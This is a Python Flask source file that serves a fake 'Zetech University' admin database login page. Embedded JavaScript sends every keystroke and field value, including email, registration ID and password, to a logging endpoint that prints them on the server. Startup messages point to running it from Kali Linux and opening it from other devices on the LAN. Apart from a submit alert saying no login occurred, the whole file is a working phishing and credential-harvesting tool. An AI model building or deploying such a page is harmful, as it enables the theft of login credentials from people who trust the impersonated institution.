from flask import Flask, request, render_template_string
import datetime  # To include a timestamp with keystrokes

app = Flask(__name__)

# Route for the fake login page
@app.route('/')
def fake_login():
    """
    Renders a simulated login page for Zetech University.
    Includes JavaScript to capture keystrokes and send them to the server.
    """
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔒 Zetech University DATABASE Login</title>
<style>
body {
font-family: 'Inter', sans-serif;
display: flex;
justify-content: center;
align-items: center;
min-height: 100vh;
background-color: #1a1a2e;
color: #e0e0e0;
margin: 0;
}
.container {
background-color: #2a2a4a;
padding: 30px;
border-radius: 12px;
box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
text-align: center;
max-width: 420px;
width: 90%;
}
.logo-img {
width: 70px;
height: 70px;
margin-bottom: 15px;
}
h1 {
color: #87ceeb;
margin-bottom: 20px;
font-size: 1.7em;
}
input[type="text"], input[type="password"], select {
width: calc(100% - 24px);
padding: 12px;
margin: 12px 0;
border: 1px solid #4a4a70;
border-radius: 8px;
background-color: #1a1a2e;
color: #e0e0e0;
font-size: 1em;
box-sizing: border-box;
}
button {
background-color: #00bfff;
color: white;
padding: 12px 25px;
border: none;
border-radius: 8px;
cursor: pointer;
font-size: 1.1em;
transition: background-color 0.3s ease, transform 0.2s ease;
margin-top: 20px;
}
button:hover {
background-color: #009acd;
transform: translateY(-2px);
}
.disclaimer {
font-size: 0.85em;
color: #ff6347;
margin-top: 30px;
line-height: 1.5;
}
</style>
</head>
<body>
<div class="container">
<img src="https://upload.wikimedia.org/wikipedia/commons/5/59/User-admin.svg" class="logo-img" alt="Logo">
<h1>🔒 Zetech University Database Login (ADMIN PAGE)</h1>
<form id="loginForm" onsubmit="event.preventDefault(); alert(' You need admin rights to continue. No actual login occurred.');">
<input type="text" placeholder="Email" id="email" data-field="email"><br>
<input type="text" placeholder="Registration ID" id="regid" data-field="regid"><br>
<input type="password" placeholder="Password" id="password" data-field="password"><br>
<select id="role" data-field="role">
<option value="" disabled selected>Select Role</option>
<option value="admin">Admin</option>
<option value="staff">Staff</option>
<option value="student">Student</option>
</select><br>
<button type="submit">Login</button>
</form>
<div class="disclaimer">
<strong>Only for admin access</strong><br><br>
<strong>CONTAINS </strong>Sensitive data.
</div>
</div>
<script>
const inputs = document.querySelectorAll('input[type="text"], input[type="password"], select');
const logEndpoint = '/log_keystrokes';
inputs.forEach(input => {
input.addEventListener('change', sendData);
input.addEventListener('keyup', sendData);
});
function sendData(e) {
const input = e.target;
const fieldName = input.dataset.field;
const keyValue = e.key || "selected";
const currentValue = input.value;
const timestamp = new Date().toISOString();
fetch(logEndpoint, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify({
field: fieldName,
key_pressed: keyValue,
current_value: currentValue,
timestamp: timestamp
})
}).catch(error => {
console.error('Error sending keystroke data:', error);
});
}
</script>
</body>
</html>
''')

# Route to receive and print keystroke data
@app.route('/log_keystrokes', methods=['POST'])
def log_keystrokes():
    """
    Receives JSON data containing keystroke information from the client-side
    and prints it to the Flask server's terminal output.
    """
    try:
        data = request.get_json()
        if data:
            field = data.get('field', 'unknown_field')
            key_pressed = data.get('key_pressed', 'N/A')
            current_value = data.get('current_value', '')
            timestamp = data.get('timestamp', 'N/A')
            print(f"[{timestamp}] Keystroke from '{field}': Key='{key_pressed}', Value='{current_value}'")
            return {"status": "success", "message": "Keystroke logged"}, 200
        else:
            print(f"[{datetime.datetime.now().isoformat()}] Received empty or invalid JSON data.")
            return {"status": "error", "message": "No JSON data received"}, 400
    except Exception as e:
        print(f"[{datetime.datetime.now().isoformat()}] Error processing keystroke log: {e}")
        return {"status": "error", "message": str(e)}, 500

if __name__ == '__main__':
    print("--- Flask Keystroke Logger Started ---")
    print("Access the page from your browser:")
    print("  On this machine (Kali Linux): http://127.0.0.1")
    print("  From another device on your LAN: http://YOUR_KALI_IP")
    app.run(host='0.0.0.0', port=80, debug=True)
